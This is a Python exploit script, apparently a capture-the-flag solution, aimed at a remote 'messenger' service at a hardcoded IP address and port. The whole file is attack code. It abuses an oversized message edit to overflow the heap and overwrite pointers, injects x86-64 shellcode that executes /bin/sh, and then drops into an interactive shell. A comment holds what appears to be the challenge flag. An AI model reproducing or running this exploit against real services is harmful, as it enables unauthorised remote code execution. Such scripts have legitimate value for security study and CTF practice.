from pwnlib import *

# 1_wan3_y0ur_m3ssenger$%

#s = Socket(("localhost", 6767))
s = Socket(("110.10.212.137", 3334))
s.ru("[Q]uit\n>> ")

def change(n, data):
	s.send("C\n")

	s.ru("index : ")
	s.send("%d\n" % n)

	s.ru("size : ")
	s.send("9999\n")

	s.ru("msg : ")
	s.send("%s" % data)

	s.ru("[Q]uit\n>> ")


def leave(size, msg="AAAA"):
	s.send("L\n")

	s.ru("size : ")
	s.send("%d\n" % size)

	s.ru("msg : ")
	s.send("%s" % msg)

	s.ru("[Q]uit\n>> ")

final = "31c05048b92f2f62696e2f736851545f5057545e99b03b0f05".decode("hex")

shellcode = "\xeb\x2e"

target = 0x602070

payload = bytearray(pattern(0x28))
payload[:len(shellcode)] = shellcode
payload[0x20:0x28] = pq(target - 0x10)
payload += "\x30"

leave(8, "AAAA")
leave(32, final)

change(0, payload)

# remove #1
s.send("R\n")
s.ru("index : ")
s.send("1\n")

# call exit -> get $pc
s.ru("[Q]uit\n>> ")
s.send("1337\n")



s.interact()
